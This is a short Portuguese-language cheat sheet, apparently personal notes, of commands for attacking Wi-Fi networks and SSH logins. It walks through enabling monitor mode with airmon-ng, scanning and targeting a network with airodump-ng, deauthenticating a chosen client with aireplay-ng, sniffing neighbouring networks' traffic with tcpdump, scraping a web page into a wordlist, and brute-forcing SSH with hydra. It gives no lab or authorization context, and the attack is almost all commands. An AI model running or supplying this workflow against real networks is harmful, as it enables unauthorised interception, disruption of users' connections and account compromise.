# Comandos

COMANDOS PARA DETECTAR E ACIONAR O MODO MONITOR

Caso o adaptador não esteja funcionando, digite: Win + R > services.msc e reinicie todos os serviços da VMWare.

```
ifconfig                                #para ver se temos uma interface wlan0 conectada;
ipconfig                                #aqui conseguimos ver se a interface esta devidamente conectada e em qual modo esta configurada (geralmente esta em modo Gerenciamento ou Mnaged)
iwconfig <interface>                    #apenas para termos uma visao mais limpa, com a interface especifica selecionada
```

Etapa I&#x20;

```
sudo airmon-ng check                    #averiguar se existe algum processo que pode atrapalhar o modo monitor
sudo airmon-ng check kill               #para matar os processos que podem interferir o adaptador em modo monitor
sudo airmon-ng start <interface>        #aqui sim habilitamos o modo monitor, no meu caso precisei rodar este comando 2x, tente rodar com ele apenas uma vez antes de tentar fazer 2x
ifconfig                                #verificar se nossa rede criada apareceu
iwconfig <interface_criada>             #verificar se esta em modo monitor, no meu caso a interface era a mesma (wlan0) e so mudou que precisei setar uma porta para ler
```

### o comando abaixo talvez nao precise ser inserido, apenas em casos especificos

```
iwconfig <interface> channel <canal>    #aqui eu setei o canal para tornar a leitura nele viavel
```

### aqui tudo volta ao normal

```
sudo airodump-ng <interface>            #aqui ele detecta as redes, traz detalhes como: endereço do AP (access point), dados transmitidos entre a rede, o canal em que ele se encontra, o tipo de criptografia e autorizaçao, o nome SSID e dispositivos conectados ao AP. 
```

\#Encontrar a linha onde está a rede alvo usando o SSID e copiar&#x20;

```
sudo airodump-ng <canal> -w <arquivo_output> -d <BSSID> <interface> #averiguando como está a rede alvo (dispositivos conectados)
aireplay-ng --deauth 0 -a <BSSID> -c <STATION> <interface> #desautenticando um host específico
tcpdump -i <interface>                  #para começar a ler o trafego das redes vizinhas
tcpdump -vv -nn -i <interface>          #para começar a ler o trafego das redes vizinhas com informaçoes mais precisas
```

\#Etapa Ia&#x20;

```
curl <website> | sed 's/[^a-zA-Z]/ /g' | tr 'A-Z' 'a-z\n' | grep '[a-z]' | sort -u > /tmp/wordlist.txt
					#comando para acessar uma webpage, selecionar conteúdo em texto presente na página, formatar em forma de texto pulando sempre uma linha após o texto, organizar alfabeticamente e salvar em um arquivo temporário de nome wordlist.txt
```

Etapa II&#x20;

```
hydra -l <usuario> -P /tmp/wordlist.txt -V -f 4 <ip_alvo> ssh
					#comando para tentar bruteforce com nome de usuário dado, usando uma wordlist específica em um ipv4 dado usando protocolo ssh (teoricamente porta 22, mas pode ter sido alterada)
```
